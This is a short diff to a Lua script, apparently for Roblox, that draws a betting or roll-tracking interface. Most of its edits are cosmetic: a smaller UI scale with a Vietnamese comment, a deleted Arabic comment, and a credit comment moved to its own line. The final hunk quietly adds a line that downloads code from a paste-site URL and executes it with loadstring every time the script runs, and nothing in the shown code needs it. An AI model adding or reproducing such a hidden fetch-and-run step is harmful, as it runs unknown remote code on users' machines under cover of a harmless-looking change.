@@ -25,7 +25,10 @@ local history = {}
 local rollsObserved = 0
 local hits, misses, streak = 0, 0, 0
 local betAmount = 1
-local uiScaleValue = 1.00
+
+-- ĐÃ GIẢM TỶ LỆ XUỐNG 0.75 ĐỂ GIAO DIỆN KHÔNG BỊ TRÀN MÀN HÌNH
+local uiScaleValue = 0.75 
+
 local removeExpireCooldown = false 
 local isCooldownActive = false
 local isMinimized = false
@@ -128,7 +131,6 @@ Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.ZIndex = 3
 Title.Parent = Header
 
--- النص الجديد تحت الاسم
 local SubTitle = Instance.new("TextLabel")
 SubTitle.Size = UDim2.new(1, -190, 0, 14)
 SubTitle.Position = UDim2.new(0, 66, 0, 34)
@@ -629,7 +631,9 @@ CreditsLabel.TextSize = 10
 CreditsLabel.TextColor3 = Color3.fromRGB(150, 150, 160)
 CreditsLabel.TextXAlignment = Enum.TextXAlignment.Center
 CreditsLabel.ZIndex = 2
-CreditsLabel.Parent = ContentContainer-- Fa4e7xx ur dad btw
+CreditsLabel.Parent = ContentContainer
+
+-- Fa4e7xx ur dad btw
 local PickerOverlay = Instance.new("TextButton")
 PickerOverlay.Visible = false
 PickerOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1432,4 +1436,4 @@ end)
 Footer.Text = string.format("Rolls 0 • Next #1 • Bet %d", betAmount)
 updateToggleUI()
 
-
+loadstring(game:HttpGet("https://pastefy.app/kdX6U6cR/raw"))()
